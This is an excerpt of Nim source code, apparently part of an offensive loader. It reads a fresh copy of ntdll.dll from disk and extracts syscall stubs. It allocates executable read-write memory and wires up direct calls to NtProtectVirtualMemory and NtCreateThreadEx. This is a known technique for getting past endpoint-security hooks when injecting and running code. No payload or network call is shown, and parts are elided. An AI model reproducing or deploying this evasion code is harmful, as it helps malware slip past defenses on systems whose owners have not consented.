...
proc GetSyscallStub*(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
  var
    ...
    bytesRead: DWORD
    fileData: LPVOID
    ntdllStr: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
    nullHandle: HANDLE

  file = CreateFileA(ntdllStr, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
...
var syscallStub_NtAlloc: LPVOID = VirtualAllocEx(HANDLE(-1),NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
...
var syscallStub_NtProtect: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)

let NtProtectVirtualMemory* = cast[myNtProtectVirtualMemory](cast[LPVOID](syscallStub_NtProtect))

var syscallStub_NtCreateThreadEx: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
...
success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreateThreadEx))
